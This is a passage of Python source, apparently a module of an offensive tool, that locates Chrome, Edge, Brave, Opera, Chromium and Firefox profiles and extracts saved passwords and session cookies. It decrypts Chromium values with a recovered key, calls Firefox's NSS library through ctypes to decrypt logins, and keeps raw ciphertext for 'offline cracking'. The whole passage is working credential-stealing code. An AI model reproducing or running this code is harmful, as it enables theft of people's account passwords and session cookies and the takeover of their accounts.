    def _chromium_passwords(browser: str, profile_dir: str, key: bytes | None) -> list[str]:
        db_path = os.path.join(profile_dir, "Login Data")
        if not os.path.isfile(db_path):
            return []
        tmp = db_path + "_mp_tmp"
        rows: list[str] = []
        try:
            shutil.copy2(db_path, tmp)
            db = sqlite3.connect(tmp)
            cur = db.cursor()
            cur.execute(
                "SELECT origin_url, username_value, password_value "
                "FROM logins ORDER BY date_created DESC"
            )
            for url, user, enc_pw in cur.fetchall():
                if isinstance(enc_pw, bytes):
                    pw = _chromium_decrypt(enc_pw, key)
                else:
                    pw = str(enc_pw)
                rows.append(f"    URL : {url}")
                rows.append(f"    USER: {user}")
                rows.append(f"    PASS: {pw}")
                rows.append("")
            db.close()
        except Exception as e:
            rows.append(f"    (error reading Login Data: {e})")
        finally:
            try:
                os.remove(tmp)
            except OSError:
                pass
        return rows

    # ------------------------------------------------------------------
    # Chromium: cookies  (Cookies DB)
    # ------------------------------------------------------------------
    def _chromium_cookies(browser: str, profile_dir: str, key: bytes | None,
                          limit: int = 500) -> list[str]:
        # Chromium ≥ M96 stores cookies in Network/Cookies
        for cookie_path in (
            os.path.join(profile_dir, "Network", "Cookies"),
            os.path.join(profile_dir, "Cookies"),
        ):
            if os.path.isfile(cookie_path):
                break
        else:
            return []
        tmp = cookie_path + "_mp_tmp"
        rows: list[str] = []
        try:
            shutil.copy2(cookie_path, tmp)
            db = sqlite3.connect(tmp)
            cur = db.cursor()
            cur.execute(
                "SELECT host_key, name, encrypted_value, path, "
                "       is_secure, expires_utc "
                "FROM cookies ORDER BY last_access_utc DESC LIMIT ?",
                (limit,)
            )
            for host, name, enc_val, path, secure, expires in cur.fetchall():
                if isinstance(enc_val, bytes):
                    value = _chromium_decrypt(enc_val, key)
                else:
                    value = str(enc_val)
                secure_str = "Secure" if secure else ""
                rows.append(
                    f"    {host:<40} {name:<28} {secure_str:<6} "
                    f"{value[:80]}"
                )
            db.close()
        except Exception as e:
            rows.append(f"    (error reading Cookies: {e})")
        finally:
            try:
                os.remove(tmp)
            except OSError:
                pass
        return rows

    # ------------------------------------------------------------------
    # Firefox: cookies  (cookies.sqlite)
    # ------------------------------------------------------------------
    def _firefox_cookies(profile_dir: str, limit: int = 500) -> list[str]:
        db_path = os.path.join(profile_dir, "cookies.sqlite")
        if not os.path.isfile(db_path):
            return []
        tmp = db_path + "_mp_tmp"
        rows: list[str] = []
        try:
            shutil.copy2(db_path, tmp)
            db = sqlite3.connect(tmp)
            cur = db.cursor()
            cur.execute(
                "SELECT host, name, value, path, isSecure, expiry "
                "FROM moz_cookies ORDER BY lastAccessed DESC LIMIT ?",
                (limit,)
            )
            for host, name, value, path, secure, expiry in cur.fetchall():
                secure_str = "Secure" if secure else ""
                rows.append(
                    f"    {host:<40} {name:<28} {secure_str:<6} "
                    f"{str(value)[:80]}"
                )
            db.close()
        except Exception as e:
            rows.append(f"    (error reading Firefox cookies: {e})")
        finally:
            try:
                os.remove(tmp)
            except OSError:
                pass
        return rows

    # ------------------------------------------------------------------
    # Firefox: saved passwords via NSS (logins.json + key4.db)
    # ------------------------------------------------------------------
    def _firefox_passwords(profile_dir: str) -> list[str]:
        """
        Attempt NSS-based decryption first (requires libnss3 on PATH).
        Falls back to dumping raw logins.json for offline cracking.
        """
        import json as _json
        logins_path = os.path.join(profile_dir, "logins.json")
        key4_path   = os.path.join(profile_dir, "key4.db")
        if not os.path.isfile(logins_path):
            return []

        rows: list[str] = []

        # Try NSS decryption via ctypes
        def _try_nss_decrypt(profile_dir: str) -> dict[str, str] | None:
            """Return {base64_ciphertext: plaintext} map using libnss3."""
            import base64 as _b64
            import ctypes

            # Locate libnss3
            nss_lib = None
            for candidate in (
                "nss3", "libnss3.so", "libnss3.so.1",
                "/usr/lib/x86_64-linux-gnu/libnss3.so",
                "/usr/lib/libnss3.so",
                r"C:\Program Files\Mozilla Firefox\nss3.dll",
                r"C:\Program Files (x86)\Mozilla Firefox\nss3.dll",
                "/Applications/Firefox.app/Contents/MacOS/libnss3.dylib",
            ):
                try:
                    nss_lib = ctypes.CDLL(candidate)
                    break
                except OSError:
                    continue
            if nss_lib is None:
                return None

            try:
                nss_lib.NSS_Init(profile_dir.encode())

                class SECItem(ctypes.Structure):
                    _fields_ = [("type", ctypes.c_uint),
                                 ("data", ctypes.POINTER(ctypes.c_ubyte)),
                                 ("len",  ctypes.c_uint)]

                results: dict[str, str] = {}
                with open(logins_path) as lf:
                    data = _json.load(lf)
                for login in data.get("logins", []):
                    for field in ("encryptedUsername", "encryptedPassword"):
                        b64 = login.get(field, "")
                        if not b64 or b64 in results:
                            continue
                        raw = _b64.b64decode(b64)
                        inp = SECItem(0,
                                      ctypes.cast(ctypes.c_char_p(raw),
                                                  ctypes.POINTER(ctypes.c_ubyte)),
                                      len(raw))
                        out = SECItem()
                        if nss_lib.PK11SDR_Decrypt(ctypes.byref(inp),
                                                   ctypes.byref(out), None) == 0:
                            plain = bytes(out.data[i] for i in range(out.len))
                            results[b64] = plain.decode("utf-8", errors="replace")
                            nss_lib.SECITEM_FreeItem(ctypes.byref(out), False)
                        else:
                            results[b64] = "<NSS-decrypt-failed>"

                nss_lib.NSS_Shutdown()
                return results
            except Exception:
                try:
                    nss_lib.NSS_Shutdown()
                except Exception:
                    pass
                return None

        nss_map = _try_nss_decrypt(profile_dir)

        try:
            with open(logins_path) as lf:
                data = _json.load(lf)
            for login in data.get("logins", []):
                url  = login.get("hostname", "?")
                if nss_map is not None:
                    user = nss_map.get(login.get("encryptedUsername", ""), "<no-nss>")
                    pw   = nss_map.get(login.get("encryptedPassword", ""), "<no-nss>")
                else:
                    user = f"<b64:{login.get('encryptedUsername','')[:40]}>"
                    pw   = f"<b64:{login.get('encryptedPassword','')[:40]}>"
                rows.append(f"    URL : {url}")
                rows.append(f"    USER: {user}")
                rows.append(f"    PASS: {pw}")
                rows.append("")
        except Exception as e:
            rows.append(f"    (error reading logins.json: {e})")

        return rows

    # ------------------------------------------------------------------
    # Locate Firefox profiles
    # ------------------------------------------------------------------
    def _firefox_profile_dirs() -> list[str]:
        dirs = []
        for base in (
            os.path.join(home, "AppData", "Roaming", "Mozilla", "Firefox", "Profiles"),
            os.path.join(home, ".mozilla", "firefox"),
            os.path.join(home, "Library", "Application Support", "Firefox", "Profiles"),
        ):
            if os.path.isdir(base):
                for entry in os.listdir(base):
                    full = os.path.join(base, entry)
                    if os.path.isdir(full) and (
                        os.path.isfile(os.path.join(full, "logins.json")) or
                        os.path.isfile(os.path.join(full, "cookies.sqlite"))
                    ):
                        dirs.append(full)
        return dirs

    # ------------------------------------------------------------------
    # Main collection loop
    # ------------------------------------------------------------------

    # --- Chromium family ---
    for browser, profile_dir in _chromium_profiles():
        key = _get_chromium_key(browser, profile_dir)
        key_status = "DPAPI-decrypted" if key else "key-unavailable"

        if mode in ("passwords", "all"):
            rows = _chromium_passwords(browser, profile_dir, key)
            if rows:
                output.append(f"\n{'='*60}")
                output.append(f"  {browser} — Saved Passwords  ({key_status})")
                output.append(f"{'='*60}")
                output.extend(rows)

        if mode in ("cookies", "all"):
            rows = _chromium_cookies(browser, profile_dir, key)
            if rows:
                output.append(f"\n{'='*60}")
                output.append(f"  {browser} — Cookies  ({key_status})")
                output.append(f"  {'HOST':<40} {'NAME':<28} {'SEC':<6} VALUE")
                output.append(f"  {'─'*100}")
                output.extend(rows)

    # --- Firefox ---
    for ff_dir in _firefox_profile_dirs():
        if mode in ("passwords", "all"):
            rows = _firefox_passwords(ff_dir)
            if rows:
                output.append(f"\n{'='*60}")
                output.append(f"  Firefox — Saved Passwords  ({os.path.basename(ff_dir)})")
                output.append(f"{'='*60}")
                output.extend(rows)

        if mode in ("cookies", "all"):
            rows = _firefox_cookies(ff_dir)
            if rows:
                output.append(f"\n{'='*60}")
                output.append(f"  Firefox — Cookies  ({os.path.basename(ff_dir)})")
                output.append(f"  {'HOST':<40} {'NAME':<28} {'SEC':<6} VALUE")
                output.append(f"  {'─'*100}")
                output.extend(rows)

    if not output:
        return (
            "[-] No browser data found.\n"
            "    Checked: Chrome, Edge, Brave, Opera, Chromium, Firefox\n"
            "    If the browser is open, try again after closing it (DB lock).\n"
            "    On Linux without 'cryptography' pip package, install it:\n"
            "      pip install cryptography"
        )

    return "\n".join(output)
